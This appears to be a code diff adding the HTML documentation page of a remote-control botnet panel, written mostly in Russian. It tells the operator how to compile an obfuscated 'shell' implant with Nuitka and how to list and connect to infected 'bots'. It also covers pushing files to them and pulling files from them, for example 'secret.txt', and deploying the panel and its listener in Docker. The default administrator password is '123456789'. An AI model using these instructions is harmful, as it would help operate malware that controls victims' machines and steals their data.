@@ -1,0 +1,96 @@
+{% extends "layout.html" %}
+
+{% block activedocumentation %}active{% endblock %}
+
+{% block content %}
+    <div class="container text-light"  style="margin-left: 20%;  margin-top: 2%">
+        <h1>Documentation:</h1>
+        <div class="m-5">
+            <hr>
+            <h3 class="text-primary">Builder</h3>
+            <p class="text-secondary">This is a documentation for builder</p>
+            <p>Что бы сбилдить шелл нужно скопировать папку на ту систему, под которую планируется билд (windows/linux)<br>
+                Далее установить python и pip<br>
+                А так же установить нуитку (nuitka) и модуль standalone<br>
+                <p>&emsp;pip3 install nuitka</p>
+                <p>&emsp;pip3 install zstandard</p>
+                <p>Далее переходим в папку и прописываем:</p>
+                <p>&emsp;python3 builder.py --obfuscation true --new_name bot</p>
+                <p>Билдер может собирать файл с использованием обфускации и без неё,<br>
+                    Чтобы без обфускации нужно убрать из предыдущей команды флаг --obfuscation
+                </p>
+            </p>
+
+
+            <hr>
+            <h3 class="text-primary">Console</h3>
+            <p class="text-secondary">Документация к терминалу</p>
+            <p class="text-light">Commands:</p>
+            <p class="text-light">~$ status - вернёт статус листенера</p>
+            <p class="text-light">~$ reload - перезапустит листенер, нужно для обновления статуса ботов</p>
+            <p class="text-light">~$ show - покажет ботов, достпуных для подключения, так же можно посмотреть в
+                <a href="/board">Board</a>
+            </p>
+            <p class="text-light">~$ clear - очистит консоль</p>
+            <p class="text-light">~$ help - покажет первостепенную справку</p>
+            <p class="text-light">~$ connect {your_ip} - подключиться к боту. Например: connect 12.56.326.1</p>
+            <p class="text-light">~$ disconnect - отключиться от бота</p>
+            <p class="text-light">~$ files - покажет файлы, загруженные в панель, которые можно загрузить в бота</p>
+            <p class="text-light">~$ upload {filename} - загрузить файл в бота из доступных. Например: upload file.txt</p>
+            <p class="text-light">~$ download - скачать файл с бота. Например: download secret.txt</p>
+
+
+            <hr>
+            <h3 class="text-primary">Upload file</h3>
+            <p class="text-secondary">Загрузить файлы в панель</p>
+            <p>Что бы загрузить файлы в панель нужно перейти во вкладку <a href="/upload/file">Upload file</a>
+                и загрузить файл.<br>
+                Так же там отображаются все загруженные файлы и по нажатию на крестик их можно удалить</p>
+            <img src="{{ url_for('static', filename='doc/upload.png') }}" alt="upload">
+
+
+            <hr>
+            <h3 class="text-primary">Board</h3>
+            <p class="text-secondary">This is a documentation for board and bots</p>
+            <p>В <a href="/board">Board</a> можно посмотреть всех когда-либо подключанных ботов,<br>
+            добавить в избранное, удалить бота,посмотреть скаченные файлы и подключиться к нему</p>
+            <img src="{{ url_for('static', filename='doc/panel.png') }}" alt="bots">
+            <p></p>
+            <p>Нажав на сердечко бот добавится в избранное и будет отображаться сверху<br>
+            Так же можно посмотреть IP и нынешний статус бота, перед этим следует перезапустить листенер</p>
+            <img src="{{ url_for('static', filename='doc/favorite.png') }}" alt="favorite">
+            <p></p>
+            <p>Чтобы подключиться к боту и перейти в терминал нужно нажать на круглую консоль слева от папки<br>
+            Справа от папки при нажатии на крестик бот удалиться из базы данных (навсегда)<br>
+            </p>
+            <img src="{{ url_for('static', filename='doc/files.png') }}" alt="files">
+            <p>Нажав на папку откроется страница бота:</p>
+            <img src="{{ url_for('static', filename='doc/bot_page.png') }}" alt="bot_page">
+            <p>Здесь будут отображаться скаченные файлы</p>
+
+
+            <hr>
+            <h3 class="text-primary">User</h3>
+            <p class="text-light">В панеле один юзер - administrator</p>
+            <p class="text-light">Пароль по умолчанию: "123456789"</p>
+            <p class="text-light">Чтобы сменить пароль, нужно перейти в соответствующую вкладку change password <br> в меню чуть выше logout</p>
+
+
+            <hr>
+            <h3 class="text-primary">Deploy</h3>
+            <p class="text-secondary">Как развернуть панель на сервере?</p>
+            <p class="text-light">Что-бы развернуть панель на сервере<br>
+                (linux ubuntu/debian)<br> - нужно копировать на удалённый сервер панель,<br>
+                перейти в ее папку и прописать команды:<br></p>
+            <p>&emsp;make install<br>
+                &emsp;make run<br></p>
+            <p>
+                После этого панель будет запущенна в docker container на вашем сервере.<br>
+                Панель работает на порту 80, а листенер на 5002.
+            </p>
+            <p>Так же у make есть другие команды:</p>
+            <p>&emsp;uninstall - удалит панель docker container с панелью и образ</p>
+            <p>&emsp;restart - перезапускает панель в docker container'е</p>
+        </div>
+    </div>
+{% endblock %}
